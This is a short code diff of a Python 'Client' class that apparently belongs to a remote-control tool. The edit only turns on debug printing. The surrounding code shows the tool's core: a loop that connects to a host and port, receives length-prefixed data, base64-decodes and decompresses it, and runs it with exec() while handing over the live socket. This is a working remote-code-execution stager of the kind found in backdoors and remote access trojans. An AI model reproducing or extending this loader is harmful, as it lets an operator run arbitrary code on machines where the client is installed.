@@ -31,11 +31,11 @@ class Client:
                 self.socket: socket.socket = socket.socket(
                     2, socket.SOCK_STREAM)
                 self.socket.connect((self.host, self.port))
-                # print("Connected")
+                print("Connected")
                 break
             except Exception as e:
                 pass
-                # print('An exception occurred.', e)
+                print('An exception occurred.', e)
             c += 1
 
     def mainLoop(self):
@@ -48,7 +48,8 @@ class Client:
                 while len(d) < l:
                     d += self.socket.recv(l-len(d))
                 exec(zlib.decompress(base64.b64decode(d)), {'s': self.socket})
-            except:
+            except Exception as e:
+                print("e2", str(e))
                 self.waitUntilConnect()
 
 
